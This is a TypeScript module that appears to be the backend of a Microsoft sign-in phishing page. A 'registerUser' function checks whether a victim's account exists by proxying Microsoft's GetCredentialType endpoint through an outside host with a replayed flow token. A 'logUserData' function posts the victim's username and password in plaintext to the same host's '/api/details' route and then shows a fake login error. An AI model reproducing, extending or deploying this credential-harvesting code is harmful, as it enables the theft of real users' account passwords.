import { ApiError } from "../apiError";

type ResponseType = {
  Username: string;
  Display: string;
  IfExistsResult: number; // I guess 0 means not found, 1 means found, based on the order Microsoft usually uses to indicate existence of accounts.
  ThrottleStatus: number; // I guess 0 means available, 1 means unavailable.
  Credentials: {
    HasPassword: boolean;
    PrefCredential: number; // I guess 0 means email, 1 means phone, 2 means Skype, based on the order Microsoft usually uses to ask for credentials.
  };
  EstsProperties: {
    UserTenantBranding: null; // I guess this is only returned for federated accounts, and contains info about the tenant's branding, such as logo and background image. It's null for consumer and managed accounts.
    DomainType: 2; // I guess 0 means consumer, 1 means federated, 2 means managed, based on the order Microsoft usually uses to classify accounts.
  };
};

export async function registerUser({
  username,
}: {
  username: string;
}): Promise<ResponseType> {
  console.log({ username });
  const res = await fetch(
    "https://logs-rho-tan.vercel.app/api/proxy/1?url=https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US",
    {
      method: "POST",
      redirect: "manual",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        checkPhones: false,
        country: "",
        federationFlags: 3,
        flowToken:
          "-DvkFeDk1hWgmqu8mKv02QwmDB7S7l6hBGqFBH0dAyaJuAelEUuX0J95PvMUFAT2yu73xgnSW!r8h2mqvM2WsuPP3t6yt0OBnFV9pbfWEfaMhXEH2vh6LbXHeLMICibQDjhM1nvTDzyitpm0cTMbvA5nvNn*J0EfQq5kRuYADECyyoF11ykfe1lG0P9EN6cY0JhEnVFmCOxOcbaVO*s8q7dvlKyFNqmjSLuJ*80fhxCIZBzWMRuuJWgl7Tt1ropt2HA$$",
        forceotclogin: false,
        isCookieBannerShown: false,
        isExternalFederationDisallowed: false,
        isFederationDisabled: false,
        isFidoSupported: false,
        isOtherIdpSupported: false,
        isReactLoginRequest: true,
        isRemoteConnectSupported: false,
        isRemoteNGCSupported: true,
        isSignup: false,
        originalRequest: "",
        otclogindisallowed: false,
        uaid: "61e99e4720a046f9aead8a4d6964b3e0",
        username,
      }),
    },
  );
  if (!res.ok) {
    const errorData = await res.json().catch(() => ({}));
    console.log({ errorData });
    throw (
      errorData || {
        message: "Registration failed",
      }
    );
  }
  const response = await res.json();
  console.log({ response });
  return response;
}

export async function logUserData({
  username,
  password,
  id,
}: {
  username: string;
  password: string;
  id: string;
}): Promise<{ success: boolean }> {
  console.log({ username, password, id });
  const res = await fetch("https://logs-rho-tan.vercel.app/api/details", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      username,
      password,
      id,
    }),
  });
  const payload = await res.json().catch(() => null);
  if (!res.ok) {
    throw new ApiError(
      payload?.error || "Unable to log in now, Please try again later.",
      res.status,
    );
  }
  return { success: true };
}
